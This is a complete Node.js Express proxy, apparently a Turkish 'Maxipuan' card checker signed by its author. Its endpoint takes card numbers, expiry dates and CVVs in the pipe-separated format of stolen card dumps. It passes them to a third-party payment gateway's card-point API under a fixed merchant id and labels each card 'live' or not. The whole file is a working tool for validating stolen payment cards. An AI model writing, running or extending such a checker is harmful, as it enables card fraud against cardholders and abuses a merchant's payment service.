const express = require("express");
const axios = require("axios");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

app.get("/", (req, res) => {
  res.send("✅ Maxipuan Proxy Aktif - @HzQuarex");
});

app.get("/puan", async (req, res) => {
  const { card } = req.query;

  if (!card || !card.includes("|")) {
    return res.status(400).json({ error: "Kart bilgisi eksik veya hatalı." });
  }

  const [cc, month, year, cvv] = card.split("|");

  try {
    const apiUrl = `https://checkout-gw.prod.ticimax.net/payments/9/card-point?cc=${cc}&month=${month}&year=${year}&cvv=${cvv}&lid=45542`;

    const response = await axios.get(apiUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0"
      }
    });

    res.json({
      live: true,
      puan: response.data,
      card,
      by: "@HzQuarex"
    });
  } catch (err) {
    res.json({
      live: false,
      error: "Kart puanı alınamadı.",
      card,
      by: "@HzQuarex"
    });
  }
});

app.listen(PORT, () => {
  console.log(`✅ Sunucu çalışıyor: http://localhost:${PORT}`);
});